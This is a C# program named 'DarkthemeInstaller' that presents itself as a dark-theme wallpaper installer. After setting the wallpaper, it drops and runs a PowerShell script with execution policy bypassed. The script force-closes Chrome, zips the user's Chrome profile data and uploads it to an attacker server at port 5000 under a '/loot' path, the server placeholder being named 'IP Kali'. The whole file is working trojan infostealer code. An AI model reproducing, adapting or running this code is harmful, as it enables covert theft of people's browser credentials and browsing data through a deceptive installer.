using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace DarkthemeInstaller {
    internal static class Program {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDCHANGE = 0x02;

        [STAThread]
        static void Main(){
            try{
                // 1. Define fixed server IP
                string serverIP = "IP Kali";

                // 2. Set up temp directory
                string tempPath = Path.Combine(Path.GetTempPath(), "DarkThemeAssets");
                Directory.CreateDirectory(tempPath);

                // 3. Execute main functions
                ApplyWallpaper(tempPath);
                RunChromeCollector(serverIP);

                MessageBox.Show("Operation completed successfully!", "Done",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex){
                MessageBox.Show($"Error: {ex.Message}", "Failure",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        static void ApplyWallpaper(string tempPath){
            string resourceName = "DarkthemeInstaller.assets.wallpaper.jpg";
            string wallpaperPath = Path.Combine(tempPath, "wallpaper.jpg");

            using (Stream? stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName)){
                if (stream == null){
                    throw new FileNotFoundException("Resource wallpaper.jpg not found in assembly");
                }

                using (FileStream fs = new FileStream(wallpaperPath, FileMode.Create)){
                    stream.CopyTo(fs);
                }
            }

            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)){
                throw new Exception("Failed to apply the wallpaper.");
            }
        }

        static void RunChromeCollector(string serverIP){
            string debugLogPath = Path.Combine(Path.GetTempPath(), "chrome_collector_debug.log");
            File.WriteAllText(debugLogPath, $"[{DateTime.Now}] Starting Chrome collection\n", Encoding.UTF8);

            try{
                string psScript = $@"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$logPath = Join-Path $env:TEMP 'chrome_debug.log'
'=== STARTING COLLECTION ===' | Out-File $logPath -Encoding utf8

try {{
    $chromePath = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
    if (-not (Test-Path $chromePath)) {{
        'Chrome not found at: ' + $chromePath | Out-File $logPath -Append
        throw 'Chrome not found'
    }}

    'Closing Chrome...' | Out-File $logPath -Append
    Get-Process -Name 'chrome' -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 5

    $tempDir = Join-Path $env:TEMP ('chrome_temp_' + (Get-Date -Format 'yyyyMMdd_HHmmss'))
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    $robocopyLog = Join-Path $env:TEMP 'chrome_robocopy.log'
    robocopy ""$chromePath"" ""$tempDir"" /MIR /COPY:DAT /R:1 /W:1 /LOG:""$robocopyLog"" /NP /NDL /NFL /XF Cookies Cookies-journal ""Safe Browsing Cookies"" Session* Tabs*

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipPath = Join-Path $env:TEMP ('chrome_data_' + (Get-Date -Format 'yyyyMMdd_HHmmss') + '.zip')
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)

    if (-not (Test-Path $zipPath) -or (Get-Item $zipPath).Length -lt 1MB) {{
        throw 'Failed to create ZIP file or file too small'
    }}

    $uploadSuccess = $false
    try {{
        'Testing server connection...' | Out-File $logPath -Append
        $connectionTest = Test-NetConnection -ComputerName {serverIP} -Port 5000 -InformationLevel Quiet
        
        if (-not $connectionTest) {{
            throw 'Server unreachable'
        }}

        'Uploading file to server...' | Out-File $logPath -Append
        $progressPreference = 'silentlyContinue'
        $response = Invoke-WebRequest -Uri 'http://{serverIP}:5000/loot' -Method Post -InFile $zipPath -ContentType 'application/zip' -TimeoutSec 30 -UseBasicParsing

        if ($response.StatusCode -ne 200) {{
            throw 'Upload failed with status: ' + $response.StatusCode
        }}

        'Upload completed successfully!' | Out-File $logPath -Append
        $uploadSuccess = $true
    }}
    catch {{
        'Upload error: ' + $_ | Out-File $logPath -Append

        try {{
            $backupPath = [Environment]::GetFolderPath('Desktop') + '\Chrome_Backup_' + (Get-Date -Format 'yyyyMMdd_HHmmss') + '.zip'
            Copy-Item $zipPath $backupPath -Force
            'Backup saved locally at: ' + $backupPath | Out-File $logPath -Append
        }}
        catch {{
            'Failed to save local backup: ' + $_ | Out-File $logPath -Append
        }}

        if (-not $uploadSuccess) {{
            throw $_
        }}
    }}
}}
catch {{
    'CRITICAL ERROR: ' + $_ | Out-File $logPath -Append
    throw $_
}}
finally {{
    if (Test-Path $tempDir) {{
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }}
}}";

                string psPath = Path.Combine(Path.GetTempPath(), "chrome_collector.ps1");
                File.WriteAllText(psPath, psScript, Encoding.UTF8);

                var psi = new ProcessStartInfo {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -File \"{psPath}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8,
                    CreateNoWindow = false
                };

                using (var proc = new Process { StartInfo = psi }){
                    proc.Start();
                    string output = proc.StandardOutput.ReadToEnd();
                    string error = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(60000);

                    File.AppendAllText(debugLogPath, $"PowerShell output:\n{output}\n", Encoding.UTF8);
                    if (!string.IsNullOrEmpty(error)){
                        File.AppendAllText(debugLogPath, $"ERRORS:\n{error}\n", Encoding.UTF8);
                    }
                }
            }
            catch (Exception ex){
                File.AppendAllText(debugLogPath, $"C# ERROR: {ex}\n", Encoding.UTF8);
                throw;
            }
        }
    }
}